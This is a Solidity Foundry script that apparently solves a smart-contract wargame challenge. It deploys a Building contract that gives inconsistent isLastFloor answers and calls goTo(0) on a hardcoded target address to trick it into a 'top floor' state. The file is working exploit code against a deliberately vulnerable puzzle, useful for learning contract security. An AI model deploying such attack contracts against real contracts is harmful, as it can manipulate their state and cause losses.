// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IBuilding {
  function isLastFloor(uint256) external returns (bool);
}

contract Building is IBuilding {
  bool calledBefore;

  function isLastFloor(uint256) external override returns (bool) {
    if (calledBefore) {
      return true;
    }
    calledBefore = true;
    return false;
  }

  function hack(address target) external {
    (bool success, ) = target.call(abi.encodeWithSignature("goTo(uint256)", 0));
    require(success, "Call to goTo() failed");
  }
}

contract Solve is Script, Test {
  address target = address(0xC3e7095FE1f26c2632b4cCa058C5c78DF03b2225);

  function run() public {
    vm.startBroadcast();
    Building b = new Building();
    b.hack(target);
    vm.stopBroadcast();
  }
}
